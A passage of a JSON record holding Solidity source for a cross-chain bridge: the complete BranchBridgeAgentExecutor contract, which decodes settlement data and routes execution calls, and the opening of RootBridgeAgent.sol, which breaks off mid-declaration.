      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {Ownable} from \"solady/auth/Ownable.sol\";\n\nimport {IBranchRouter as IRouter} from \"./interfaces/IBranchRouter.sol\";\n\nimport {BranchBridgeAgent} from \"./BranchBridgeAgent.sol\";\nimport {SettlementParams, SettlementMultipleParams} from \"./interfaces/IBranchBridgeAgent.sol\";\n\n/// @title Library for Branch Bridge Agent Executor Deployment\nlibrary DeployBranchBridgeAgentExecutor {\n    function deploy() external returns (address) {\n        return address(new BranchBridgeAgentExecutor());\n    }\n}\n\n/**\n * @title  Branch Bridge Agent Executor Contract\n * @notice This contract is used for requesting token deposit clearance and\n *         executing transactions in response to requests from the root environment.\n * @dev    Execution is \"sandboxed\" meaning upon tx failure both token deposits\n *         and interactions with external contracts should be reverted and caught.\n */\ncontract BranchBridgeAgentExecutor is Ownable {\n    /*///////////////////////////////////////////////////////////////\n                            ENCODING CONSTS\n    //////////////////////////////////////////////////////////////*/\n\n    /// AnyExec Decode Consts\n\n    uint8 internal constant PARAMS_START = 1;\n\n    uint8 internal constant PARAMS_START_SIGNED = 21;\n\n    uint8 internal constant PARAMS_END_SIGNED_OFFSET = 26;\n\n    uint8 internal constant PARAMS_ENTRY_SIZE = 32;\n\n    uint8 internal constant PARAMS_ADDRESS_SIZE = 20;\n\n    uint8 internal constant PARAMS_TKN_SET_SIZE = 128;\n\n    uint8 internal constant PARAMS_GAS_OUT = 16;\n\n    /// ClearTokens Decode Consts\n\n    uint8 internal constant PARAMS_TKN_START = 5;\n\n    uint8 internal constant PARAMS_AMT_OFFSET = 64;\n\n    uint8 internal constant PARAMS_DEPOSIT_OFFSET = 96;\n\n    constructor() {\n        _initializeOwner(msg.sender);\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                        EXECUTOR EXTERNAL FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    /**\n     * @notice Function to execute a crosschain request without any settlement.\n     * @param _router Address of the router contract to execute the request.\n     * @param _data Data received from messaging layer.\n     * @return success Boolean indicating if the operation was successful.\n     * @return result Result of the execution.\n     * @dev SETTLEMENT FLAG: 0 (No settlement)\n     */\n    function executeNoSettlement(address _router, bytes calldata _data)\n        external\n        onlyOwner\n        returns (bool success, bytes memory result)\n    {\n        //Execute remote request\n        (success, result) = IRouter(_router).anyExecuteNoSettlement(_data[25:_data.length - PARAMS_GAS_OUT]);\n    }\n\n    /**\n     * @notice Function to execute a crosschain request with a single settlement.\n     * @param _recipient Address of the recipient of the settlement.\n     * @param _router Address of the router contract to execute the request.\n     * @param _data Data received from messaging layer.\n     * @return success Boolean indicating if the operation was successful.\n     * @return result Result of the execution.\n     * @dev SETTLEMENT FLAG: 1 (Single Settlement)\n     */\n    function executeWithSettlement(address _recipient, address _router, bytes calldata _data)\n        external\n        onlyOwner\n        returns (bool success, bytes memory result)\n    {\n        //Clear Token / Execute Settlement\n        SettlementParams memory sParams = SettlementParams({\n            settlementNonce: uint32(bytes4(_data[PARAMS_START_SIGNED:25])),\n            recipient: _recipient,\n            hToken: address(uint160(bytes20(_data[25:45]))),\n            token: address(uint160(bytes20(_data[45:65]))),\n            amount: uint256(bytes32(_data[65:97])),\n            deposit: uint256(bytes32(_data[97:129]))\n        });\n\n        //Bridge In Assets\n        BranchBridgeAgent(payable(msg.sender)).clearToken(\n            sParams.recipient, sParams.hToken, sParams.token, sParams.amount, sParams.deposit\n        );\n\n        if (_data.length - PARAMS_GAS_OUT > 129) {\n            //Execute remote request\n            (success, result) = IRouter(_router).anyExecuteSettlement(_data[129:_data.length - PARAMS_GAS_OUT], sParams);\n        } else {\n            success = true;\n        }\n    }\n\n    /**\n     * @notice Function to execute a crosschain request with multiple settlements.\n     * @param _recipient Address of the recipient of the settlement.\n     * @param _router Address of the router contract to execute the request.\n     * @param _data Data received from messaging layer.\n     * @return success Boolean indicating if the operation was successful.\n     * @return result Result of the execution.\n     * @dev SETTLEMENT FLAG: 2 (Multiple Settlements)\n     */\n    function executeWithSettlementMultiple(address _recipient, address _router, bytes calldata _data)\n        external\n        onlyOwner\n        returns (bool success, bytes memory result)\n    {\n        //Bridge In Assets and Save Deposit Params\n        SettlementMultipleParams memory sParams = BranchBridgeAgent(payable(msg.sender)).clearTokens(\n            _data[\n                PARAMS_START_SIGNED:\n                    PARAMS_START_SIGNED + PARAMS_TKN_START\n                        + (uint8(bytes1(_data[PARAMS_START_SIGNED])) * uint16(PARAMS_TKN_SET_SIZE))\n            ],\n            _recipient\n        );\n\n        // Execute Calldata if any\n        if (\n            _data.length - PARAMS_GAS_OUT\n                > PARAMS_START_SIGNED + PARAMS_TKN_START\n                    + (uint8(bytes1(_data[PARAMS_START_SIGNED])) * uint16(PARAMS_TKN_SET_SIZE))\n        ) {\n            //Try to execute remote request\n            (success, result) = IRouter(_router).anyExecuteSettlementMultiple(\n                _data[\n                    PARAMS_END_SIGNED_OFFSET + (uint8(bytes1(_data[PARAMS_START_SIGNED])) * PARAMS_TKN_SET_SIZE):\n                        _data.length - PARAMS_GAS_OUT\n                ],\n                sParams\n            );\n        } else {\n            success = true;\n        }\n    }\n}"
    },
    {
      "filename": "src/ulysses-omnichain/RootBridgeAgent.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {Ownable} from \"solady/auth/Ownable.sol\";\nimport {SafeTransferLib} from \"solady/utils/SafeTransferLib.sol\";\nimport {SafeCastLib} from \"solady/utils/SafeCastLib.sol\";\n\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\n\nimport {WETH9} from \"./interfaces/IWETH9.sol\";\nimport {IUniswapV3Pool} from \"@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol\";\n\nimport {AnycallFlags} from \"./lib/AnycallFlags.sol\";\n\nimport {IAnycallProxy} from \"./interfaces/IAnycallProxy.sol\";\nimport {IAnycallConfig} from \"./interfaces/IAnycallConfig.sol\";\nimport {IAnycallExecutor} from \"./interfaces/IAnycallExecutor.sol\";\n\nimport {IApp, IRootBridgeAgent} from \"./interfaces/IRootBridgeAgent.sol\";\nimport {IBranchBridgeAgent} from \"./interfaces/IBranchBridgeAgent.sol\";\nimport {IERC20hTokenRoot} from \"./interfaces/IERC20hTokenRoot.sol\";\nimport {IRootPort as IPort} from \"./interfaces/IRootPort.sol\";\nimport {IRootRouter as IRouter} from \"./interfaces/IRootRouter.sol\";\n\nimport {VirtualAccount} from \"./VirtualAccount.sol\";\nimport {\n    IRootBridgeAgent,\n    DepositParams,\n    DepositMultipleParams,\n    Settlement,\n    SettlementStatus,\n    SettlementParams,\n    SettlementMultipleParams,\n    UserFeeInfo,\n    SwapCallbackData\n} from \"./interfaces/IRootBridgeAgent.sol\";\n\nimport {DeployRootBridgeAgentExecutor, RootBridgeAgentExecutor} from \"./RootBridgeAgentExecutor.sol\";\n\n/// @title Library for Cross Chain Deposit Parameters Validation.\nlibrary CheckParamsLib {\n    /**\n     * @notice Function to check cross-chain deposit parameters and verify deposits made on branch chain are valid.\n     * @param _localPortAddress Address of local Port.\n     * @param _dParams Cross Chain swap parameters.\n     * @param _fromChain Chain ID of the chain where the deposit was made.\n     * @dev Local hToken must be recognized and address must match underlying if exists otherwise only local hToken is checked.\n     *\n     */\n    function checkParams(address _localPortAddress, DepositParams memory _dParams, uint24 _fromChain)\n        internal\n        view\n        returns (bool)\n    {\n        if (\n            (_dParams.amount < _dParams.deposit) //Deposit can't be greater than amount.\n                || (_dParams.amount > 0 && !IPort(_localPortAddress).isLocalToken(_dParams.hToken, _fromChain)) //Check local exists.\n                || (_dParams.deposit > 0 && !IPort(_localPortAddress).isUnderlyingToken(_dParams.token, _fromChain)) //Check underlying exists.\n        ) {\n            return false;\n        }\n        return true;\n    }\n}\n\n/// @title Library for Root Bridge Agent Deployment.\nlibrary DeployRootBridgeAgent {\n    function deploy(\n        WETH9 _wrappedNativeToken,\n        uint24 _localChainId,\n        address _daoAddress,\n        address _localAnyCallAddress,\n        address _localAnyCallExecutorAddress,\n        address _localPortAddress,\n        address _localRouterAddress\n    ) external returns (RootBridgeAgent) {\n        return new RootBridgeAgent(\n            _wrappedNativeToken,\n            _localChainId,\n            _daoAddress,\n            _localAnyCallAddress,\n            _localAnyCallExecutorAddress,\n            _localPortAddress,\n            _localRouterAddress\n        );\n    }\n}\n\n/// @title  Root Bridge Agent Contract\ncontract RootBridgeAgent is IRootBridgeAgent {\n    using SafeTransferLib for address;\n    using SafeCastLib for uint256;\n\n    /*///////////////////////////////////////////////////////////////\n                            ENCODING CONSTS\n    //////////////////////////////////////////////////////////////*/\n\n    /// AnyExec Consts\n\n    uint8 internal constant PARAMS_START = 1;\n\n    uint8 internal constant PARAMS_START_SIGNED = 21;\n\n    uint8 internal constant PARAMS_ADDRESS_SIZE = 20;\n\n    uint8 internal constant PARAMS_GAS_IN = 32;\n\n    uint8 internal constant PARAMS_GAS_OUT = 16;\n\n    /// BridgeIn Consts\n\n    uint8 internal constant PARAMS_TKN_START = 5;\n\n    uint8 internal constant PARAMS_AMT_OFFSET = 64;\n\n    uint8 internal constant PARAMS_DEPOSIT_OFFSET = 96;\n\n    /*///////////////////////////////////////////////////////////////\n                        ROOT BRIDGE AGENT STATE\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Local Chain Id\n    uint24 public immutable localChainId;\n\n    /// @notice Local Wrapped Native Token\n    WETH9 public immutable wrappedNativeToken;\n\n    /// @notice Bridge Agent Factory Address.\n    address public immutable factoryAddress;\n\n    /// @notice Address of DAO.\n    address public immutable daoAddress;\n\n    /// @notice Local Core Root Router Address\n    address public immutable localRouterAdd"
    }
  ]
}